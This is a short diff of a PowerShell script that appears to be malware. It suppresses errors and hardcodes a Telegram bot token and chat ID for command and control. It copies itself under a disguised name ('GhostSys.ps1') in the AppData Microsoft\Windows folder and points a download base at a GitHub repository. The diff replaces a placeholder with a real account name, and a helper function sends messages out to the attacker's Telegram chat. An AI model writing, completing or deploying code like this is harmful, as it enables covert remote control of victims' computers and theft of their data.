@@ -3,7 +3,7 @@ $ErrorActionPreference='SilentlyContinue'
 $tok='9213324981:AAG-back1py2J5fsGXfIATEJMa2M625xBD0'
 $cid='9185389635'
 $api="https://api.telegram.org/bot$tok"
-$base='https://raw.githubusercontent.com/TWOJ_LOGIN/ghost/main'
+$base='https://raw.githubusercontent.com/ecomlyceo-dotcom/ghost/main'
 $me="$env:APPDATA\Microsoft\Windows\GhostSys.ps1"
 
 function T($m){ try{ Invoke-RestMethod "$api/sendMessage" -Method Post -Body @{chat_id=$cid;text=$m} | Out-Null }catch{} }
